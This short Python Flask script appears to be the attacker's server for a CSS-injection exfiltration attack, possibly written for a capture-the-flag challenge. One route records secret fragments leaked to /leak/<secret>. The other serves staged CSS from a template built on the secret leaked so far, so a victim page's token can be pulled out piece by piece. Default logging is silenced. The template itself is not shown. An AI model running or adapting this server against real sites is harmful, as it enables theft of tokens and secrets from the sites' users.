import logging
import time

from flask import Flask, request, render_template, Response
from typing import Dict, Union

# Turn off default logging by Flask.
l = logging.getLogger()
l.addHandler(logging.FileHandler("/dev/null"))

app: Flask = Flask(__name__)

g: Dict[str, Union[str, int]] = {
    "known_secret": "",
    "index": 0
}


@app.route("/leak/<secret>")
def leak(secret):
    g["known_secret"] = secret
    g["index"] += 1

    print("secret={}".format(g["known_secret"]))

    return "ok"


@app.route('/css/<filename>')
def css(filename):
    index: int = int(filename.split(".")[0])

    while index != g["index"]:
        time.sleep(0.01)

    return Response(render_template("tmpl.jinja2", index=index, known_secret=g["known_secret"]), headers={'Content-Type': 'text/css'})


app.run(host="0.0.0.0", port=8081, threaded=True)